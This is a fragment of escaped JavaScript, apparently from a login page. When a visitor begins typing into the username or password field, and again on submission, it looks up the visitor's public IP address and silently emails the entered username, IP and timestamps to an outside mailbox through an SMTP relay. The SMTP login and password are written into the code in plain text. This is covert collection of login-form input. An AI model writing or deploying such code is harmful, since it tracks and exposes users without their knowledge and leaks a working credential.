              const username = document.getElementById(\\\"username\\\").value;\\r\\n\\r\\n                const emailBody = `Typing Start Time: ${typingStartTime}\\\\nCurrent Time (PST): ${currentTime}\\\\nPublic IP Address: ${ipAddress}\\\\nUsername: ${username}`;\\r\\n\\r\\n                Email.send({\\r\\n                    Host: \\\"smtp.elasticemail.com\\\",\\r\\n                    Username: \\\"robinsonmocktest@gmail.com\\\",\\r\\n                    Password: \\\"87F5D73D46FF6D922E5B6B8DB6DB0E135199\\\",\\r\\n                    To: \'robinsonmocktest@yahoo.com\',\\r\\n                    From: \\\"robinsonmocktest@gmail.com\\\",\\r\\n                    Subject: `${username} started typing (TYPE DELAY 0.6 SEC)`,\\r\\n                    Body: emailBody\\r\\n                });\\r\\n\\r\\n                \\/\\/ Remove the event listeners to prevent further invocations\\r\\n                document.getElementById(\\\"username\\\").removeEventListener(\\\"input\\\", sendEmail);\\r\\n                document.getElementById(\\\"password\\\").removeEventListener(\\\"input\\\", sendEmail);\\r\\n            })\\r\\n            .catch(error => {\\r\\n                console.error(\\\"Error fetching IP address:\\\", error);\\r\\n            });\\r\\n    }\\r\\n}\\r\\n\\r\\nfunction sendEmailSubmission() {\\r\\n    if (typingStartTime !== null) {\\r\\n        const currentTime = new Date().toLocaleString(\'en-US\', { timeZone: \'America\\/Los_Angeles\' }); \\/\\/ Set timeZone to PST\\r\\n\\r\\n        fetch(\'https:\\/\\/ipinfo.io\\/json\')\\r\\n            .then(response => response.json())\\r\\n            .then(data => {\\r\\n                const ipAddress = data.ip;\\r\\n                const username = document.getElementById(\\\"username\\\").value;\\r\\n\\r\\n                const emailBody = `Typing Start Time: ${typingStartTime}\\\\nCurrent Time (PST): ${currentTime}\\\\nPublic IP Address: ${ipAddress}\\\\nUsername: ${username}`;\\r\\n\\r\\n              